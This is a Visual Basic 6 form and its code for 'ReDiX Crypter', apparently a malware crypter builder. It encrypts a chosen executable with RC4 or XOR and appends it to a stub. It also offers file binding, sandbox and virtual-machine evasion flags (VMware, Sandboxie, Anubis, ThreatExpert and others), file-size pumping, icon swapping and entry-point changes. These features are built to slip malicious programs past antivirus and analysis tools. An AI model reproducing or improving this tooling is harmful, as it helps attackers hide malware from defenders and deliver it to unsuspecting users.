VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   3  'Fester Dialog
   Caption         =   "ReDiX Crypter"
   ClientHeight    =   9255
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   6495
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9255
   ScaleWidth      =   6495
   StartUpPosition =   3  'Windows-Standard
   Begin VB.CheckBox chkBind 
      Alignment       =   1  'Rechts ausgerichtet
      Caption         =   "Enabled"
      Enabled         =   0   'False
      Height          =   255
      Left            =   5280
      TabIndex        =   39
      Top             =   2640
      Width           =   1095
   End
   Begin VB.Frame Frame1 
      Caption         =   "File to Bind"
      ForeColor       =   &H00000000&
      Height          =   855
      Left            =   120
      TabIndex        =   36
      Top             =   2640
      Width           =   6255
      Begin VB.CommandButton cmdBrowse 
         Caption         =   ". . ."
         Height          =   255
         Index           =   1
         Left            =   5640
         TabIndex        =   38
         Top             =   360
         Width           =   495
      End
      Begin VB.TextBox txtBind 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   37
         Top             =   360
         Width           =   5415
      End
   End
   Begin VB.Frame frmEncryption 
      Caption         =   "Encryption"
      Height          =   1215
      Left            =   4200
      TabIndex        =   32
      Top             =   6960
      Width           =   2175
      Begin VB.CheckBox chkXOR 
         Caption         =   "Use XOR (slow)"
         Height          =   255
         Left            =   120
         TabIndex        =   34
         Top             =   360
         Width           =   1935
      End
      Begin VB.CheckBox chkRC4 
         Caption         =   "Use RC4 (faster)"
         Height          =   255
         Left            =   120
         TabIndex        =   33
         Top             =   720
         Width           =   1935
      End
   End
   Begin VB.Frame frmIcon 
      Caption         =   "Icon Changer (256 Bit)"
      Height          =   975
      Left            =   120
      TabIndex        =   28
      Top             =   7200
      Width           =   2295
      Begin VB.CheckBox chkIcon 
         Caption         =   "Enabled"
         Height          =   255
         Left            =   840
         TabIndex        =   31
         Top             =   600
         Width           =   1215
      End
      Begin VB.TextBox txtIcon 
         Height          =   285
         Left            =   1800
         TabIndex        =   30
         Top             =   240
         Visible         =   0   'False
         Width           =   375
      End
      Begin VB.Image picIcon 
         Appearance      =   0  '2D
         BorderStyle     =   1  'Fest Einfach
         Height          =   615
         Left            =   120
         Stretch         =   -1  'True
         Top             =   240
         Width           =   615
      End
      Begin VB.Label lblMain 
         BackStyle       =   0  'Transparent
         Caption         =   "<-- Click"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   4
         Left            =   840
         TabIndex        =   29
         Top             =   240
         Width           =   1215
      End
   End
   Begin VB.CheckBox chkPE 
      Caption         =   "Realign PE Header"
      Height          =   255
      Left            =   4320
      TabIndex        =   26
      Top             =   5520
      Width           =   1935
   End
   Begin VB.Frame frmSpecial 
      Caption         =   "Extra Settings"
      Height          =   1575
      Left            =   4200
      TabIndex        =   25
      Top             =   5160
      Width           =   2175
      Begin VB.CheckBox chkEOF 
         Caption         =   "Has EOF Data"
         Height          =   255
         Left            =   120
         TabIndex        =   35
         Top             =   720
         Width           =   1935
      End
      Begin VB.CheckBox chkOEP 
         Caption         =   "Change EP"
         Height          =   255
         Left            =   120
         TabIndex        =   27
         Top             =   1080
         Width           =   1935
      End
   End
   Begin VB.PictureBox picMain 
      Appearance      =   0  '2D
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   1335
      Left            =   120
      Picture         =   "frmMain.frx":038A
      ScaleHeight     =   87
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   415
      TabIndex        =   22
      Top             =   120
      Width           =   6255
   End
   Begin VB.Frame frmDebug 
      Caption         =   "Anti Debugging"
      ForeColor       =   &H00000000&
      Height          =   1935
      Left            =   120
      TabIndex        =   11
      Top             =   5160
      Width           =   3975
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti Virtual Pc"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   7
         Left            =   120
         TabIndex        =   19
         Top             =   1080
         Width           =   1695
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti Virtual Box"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   6
         Left            =   120
         TabIndex        =   18
         Top             =   720
         Width           =   1815
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti ThreatExpert"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   5
         Left            =   2040
         TabIndex        =   17
         Top             =   1440
         Width           =   1815
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti Anubis"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   4
         Left            =   2040
         TabIndex        =   16
         Top             =   1080
         Width           =   1455
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti CWSandbox"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   3
         Left            =   120
         TabIndex        =   15
         Top             =   1440
         Width           =   1815
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti JoeBox"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   2
         Left            =   2040
         TabIndex        =   14
         Top             =   360
         Width           =   1695
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti Sandboxie"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   1
         Left            =   2040
         TabIndex        =   13
         Top             =   720
         Width           =   1695
      End
      Begin VB.CheckBox chkAnti 
         Caption         =   "Anti VMware"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   12
         Top             =   360
         Width           =   1815
      End
   End
   Begin VB.CommandButton cmdCrypt 
      Caption         =   "Crypt"
      Height          =   375
      Left            =   120
      TabIndex        =   9
      Top             =   8760
      Width           =   6255
   End
   Begin VB.Frame frmFile 
      Caption         =   "File to Crypt"
      ForeColor       =   &H00000000&
      Height          =   855
      Left            =   120
      TabIndex        =   6
      Top             =   1680
      Width           =   6255
      Begin VB.TextBox txtFile 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   8
         Top             =   360
         Width           =   5415
      End
      Begin VB.CommandButton cmdBrowse 
         Caption         =   ". . ."
         Height          =   255
         Index           =   0
         Left            =   5640
         TabIndex        =   7
         Top             =   360
         Width           =   495
      End
   End
   Begin VB.Frame frmCipher 
      Caption         =   "Encryption Password"
      ForeColor       =   &H00000000&
      Height          =   1335
      Left            =   1920
      TabIndex        =   3
      Top             =   3720
      Width           =   4455
      Begin VB.VScrollBar vsupdn 
         Height          =   405
         Left            =   3840
         Max             =   -1
         Min             =   -35
         TabIndex        =   23
         TabStop         =   0   'False
         Top             =   780
         Value           =   -25
         Width           =   255
      End
      Begin VB.TextBox txtlenght 
         Alignment       =   2  'Zentriert
         Height          =   285
         Left            =   3480
         Locked          =   -1  'True
         TabIndex        =   21
         Text            =   "25"
         Top             =   840
         Width           =   375
      End
      Begin VB.CommandButton cmdGen 
         Caption         =   "Generate Random"
         Height          =   255
         Left            =   240
         TabIndex        =   5
         Top             =   840
         Width           =   2295
      End
      Begin VB.TextBox txtPW 
         Alignment       =   2  'Zentriert
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   4
         Text            =   "XsaEwbjBLrBzr[l`QESheJFfF"
         Top             =   360
         Width           =   4215
      End
      Begin VB.Label lblMain 
         BackStyle       =   0  'Transparent
         Caption         =   "Lenght:"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   3
         Left            =   2760
         TabIndex        =   20
         Top             =   855
         Width           =   735
      End
   End
   Begin VB.Frame frmPump 
      Caption         =   "EXE Pump"
      ForeColor       =   &H00000000&
      Height          =   1335
      Left            =   120
      TabIndex        =   0
      Top             =   3720
      Width           =   1695
      Begin VB.TextBox txtPump 
         Alignment       =   2  'Zentriert
         Height          =   285
         Left            =   240
         MaxLength       =   9
         TabIndex        =   1
         Text            =   "0"
         Top             =   600
         Width           =   1215
      End
      Begin VB.Label lblMain 
         Alignment       =   2  'Zentriert
         BackStyle       =   0  'Transparent
         Caption         =   "0,00 KB"
         Height          =   195
         Index           =   2
         Left            =   120
         TabIndex        =   24
         Top             =   960
         Width           =   1455
      End
      Begin VB.Label lblMain 
         BackStyle       =   0  'Transparent
         Caption         =   "Bytes to add"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   2
         Top             =   360
         Width           =   1215
      End
   End
   Begin VB.Line Line1 
      X1              =   120
      X2              =   6360
      Y1              =   8280
      Y2              =   8280
   End
   Begin VB.Label lblMain 
      BackStyle       =   0  'Transparent
      Caption         =   "Status: ReDiX Crypter sucessfully started!"
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   0
      Left            =   240
      TabIndex        =   10
      Top             =   8400
      Width           =   5655
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function InitCommonControlsEx Lib "COMCTL32.DLL" (iccex As tagInitCommonControlsEx) As Boolean

Private Type tagInitCommonControlsEx
    lngSize As Long
    lngICC As Long
End Type

Private Const ICC_USEREX_CLASSES = &H200

Private Sub cmdBrowse_Click(index As Integer)
 Dim strFile As String
   strFile = GetOpenFileNameDLG(".exe|*.exe", "Select a file", "", Me.hwnd)
    If strFile <> "" Then
     If index = 0 Then
        txtFile.Text = strFile
     Else
        txtBind.Text = strFile
     End If
    End If
End Sub

Private Sub cmdCrypt_Click()
Dim strSaveTo As String
Dim strFile As String
Dim strBuffer1 As String
Dim strBuffer2 As String
Dim strBuffer3 As String
Dim strBuffer4 As String
Dim EOFData() As Byte


Screen.MousePointer = vbHourglass
Me.Enabled = False

If FileExist(App.Path & "\Stub\Stub.stb") = False Then lblMain(0).Caption = "Status: There is no Stub!": Beep: GoTo Err

If txtFile.Text = "" Then lblMain(0).Caption = "Status: You have to set a File, first!": Beep: GoTo Err

If chkRC4.Value <> vbChecked And chkXOR.Value <> vbChecked Then lblMain(0).Caption = "Status: You have to set an Encryption Mode, first!": Beep: GoTo Err

lblMain(0).Caption = "Status: " & "Waiting for User Input..."

strFile = txtFile.Text

EOFData = GetEOFData(strFile)

strSaveTo = GetSaveFileNameDLG(".exe|*.exe", "Select a file to Save", "", Me.hwnd)
strSaveTo = LPSTRToVBString$(strSaveTo)

If strSaveTo = "" Then strSaveTo = App.Path & "\Crypted.exe"

lblMain(0).Caption = "Status: " & "Reading File 1..."

DoEvents

Open strFile For Binary As #1
 strBuffer1 = Space(LOF(1))
 Get 1, , strBuffer1
Close #1


If chkRC4.Value = vbChecked Then
 lblMain(0).Caption = "Status: " & "Crypting String (RC4)..."
 DoEvents
 strBuffer1 = RC4(strBuffer1, txtPW.Text)
End If

If chkXOR.Value = vbChecked Then
 lblMain(0).Caption = "Status: " & "Crypting String (XOR)..."
 DoEvents
 strBuffer1 = XOREnc(strBuffer1, txtPW.Text)
End If

lblMain(0).Caption = "Status: " & "Reading File 2..."

DoEvents

Open App.Path & "\Stub\Stub.stb" For Binary As #1
 strBuffer2 = Space(LOF(1))
 Get 1, , strBuffer2
Close #1

lblMain(0).Caption = "Status: " & "Writing File..."

DoEvents

strBuffer3 = strBuffer2 & "_<>_" & strBuffer1 & "_<>_" & txtPW.Text & "_<>_" & chkAnti(0).Value & "_<>_" & chkAnti(1).Value & "_<>_" & chkAnti(2).Value & "_<>_" & _
                          chkAnti(3).Value & "_<>_" & chkAnti(4).Value & "_<>_" & chkAnti(5).Value & "_<>_" & chkAnti(6).Value & "_<>_" & chkAnti(7).Value & "_<>_" & _
                          RC4("kernel32", txtPW.Text) & "_<>_" & RC4("ntdll", txtPW.Text) & "_<>_0_<>_" & chkRC4.Value & "_<>_" & chkXOR.Value & _
                          "_<>_" & chkBind.Value
                          
                          

Open strSaveTo For Binary As #1
 Put 1, , strBuffer3
Close #1

If Val(txtPump.Text) > 0 Then
 Dim strPump As String * 700

 lblMain(0).Caption = "Status: " & "EXE Pumping..."
DoEvents
 For i = 1 To txtPump.Text
  Open strSaveTo For Append As #1
   Print #1, LOF(1) + 1, strPump
    lblMain(0).Caption = "Status: " & "EXE Pumping... [" & Format((i / txtPump.Text) * 100, "0.00") & "%]"
  Close #1
  DoEvents
 Next i
End If

If chkIcon.Value = vbChecked And txtIcon.Text <> "" Then
 InsertIcons txtIcon.Text, strSaveTo
 InsertIcons txtIcon.Text, strSaveTo
End If

If chkEOF.Value = vbChecked Then
 Open strSaveTo For Binary As #1
  Put #1, LOF(1) + 1, CStr(StrConv(EOFData, vbUnicode))
 Close #1
End If

If chkPE.Value = vbChecked Then
 lblMain(0).Caption = "Status: " & "Realigning PE Header..."
 DoEvents
 RealignPEFromFile (strSaveTo)
End If

If chkOEP.Value = vbChecked Then
 lblMain(0).Caption = "Status: " & "Changing Entry Point..."
 ChangeOEPFromFile (strSaveTo)
End If


lblMain(0).Caption = "Status: " & "File successfully crypted!": Beep

Err:
Screen.MousePointer = vbNormal
Me.Enabled = True

End Sub

Private Sub cmdFileInfo_Click()
frmFileInfo.Show
End Sub

Private Sub cmdGen_Click()
Dim strPW As String
  
 Randomize Timer
  For x = 1 To Val(txtlenght.Text)
   strPW = strPW & Chr(CLng(58 * Rnd + 1) + 64)
  Next x
  
 txtPW.Text = strPW
End Sub

Private Sub Form_Initialize()
Dim iccex As tagInitCommonControlsEx

With iccex
 .lngSize = LenB(iccex)
 .lngICC = ICC_USEREX_CLASSES
End With
      
InitCommonControlsEx iccex
End Sub

Private Sub Form_Load()
If FileExist(App.Path & "\Stub\Stub.stb") = False Then lblMain(0).Caption = "Status: There is no Stub!": Beep
cmdGen.Value = True
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
End
End Sub

Private Sub picIcon_Click()
On Error GoTo Err
 Dim strFile As String
   strFile = GetOpenFileNameDLG(".ico, .exe|*.ico; *.exe", "Select an Icon", "", Me.hwnd)
    If strFile <> "" Then
     strFile = LPSTRToVBString$(strFile)
        If Right(strFile, 3) = "exe" Then
         If FileExist(Environ("temp") & "\extracted.ico") = True Then Kill Environ("temp") & "\extracted.ico"
         ExtractIcons strFile, Environ("temp") & "\extracted.ico"
         strFile = Environ("temp") & "\extracted.ico"
        End If
        txtIcon.Text = strFile
        picIcon.Picture = LoadPicture(strFile)
    End If
    Exit Sub
Err:
    MsgBox "Only 24 Bit Icons are supported, yet!", vbCritical, "Error"
    txtIcon.Text = ""
End Sub

Private Sub txtPump_Change()
lblMain(2).Caption = Format(txtPump.Text / 1024, "0.00") & " KB"
End Sub

Private Sub txtPump_KeyPress(KeyAscii As Integer)
If Not IsNumeric(Chr(KeyAscii)) Then KeyAscii = 0: Beep: Exit Sub
End Sub

Private Sub vsupdn_Change()
txtlenght.Text = -vsupdn.Value
End Sub

